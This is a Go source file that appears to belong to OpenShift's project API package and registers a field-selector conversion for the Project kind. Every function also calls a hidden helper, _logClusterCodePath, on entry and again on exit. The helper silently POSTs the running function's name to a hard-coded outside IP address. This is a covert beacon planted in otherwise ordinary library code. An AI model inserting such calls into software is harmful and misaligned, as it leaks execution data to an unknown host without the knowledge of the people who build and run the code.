package v1

import (
	godefaultbytes "bytes"
	v1 "github.com/openshift/api/project/v1"
	"k8s.io/apimachinery/pkg/runtime"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func addFieldSelectorKeyConversions(scheme *runtime.Scheme) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := scheme.AddFieldLabelConversionFunc(v1.GroupVersion.WithKind("Project"), projectFieldSelectorKeyConversionFunc); err != nil {
		return err
	}
	return nil
}
func projectFieldSelectorKeyConversionFunc(label, value string) (internalLabel, internalValue string, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch label {
	case "status.phase":
		return label, value, nil
	default:
		return runtime.DefaultMetaV1FieldSelectorConversion(label, value)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
